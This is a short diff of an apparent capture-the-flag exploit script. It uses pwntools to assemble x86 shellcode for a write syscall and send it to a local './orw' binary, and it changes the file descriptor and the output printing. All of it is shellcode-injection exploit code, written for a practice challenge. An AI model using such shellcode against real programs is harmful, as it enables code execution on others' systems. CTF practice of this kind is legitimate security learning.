@@ -39,7 +39,7 @@ shell_code = asm('\n'.join([
 
     'mov edx, eax', # Count
     'mov ecx, esp', # Buffer
-    'mov ebx, 1', # fd
+    'mov ebx, 0', # fd
     'mov eax, 4', # Write syscall number
     'int 0x80',
 ]))
@@ -50,4 +50,5 @@ conn = process('./orw')
 log.info('Pwning start')
 conn.recvuntil("Give my your shellcode:")
 conn.sendline(shell_code)
-print(conn.recvall())
+# print(conn.recvall())
+conn.recvall()
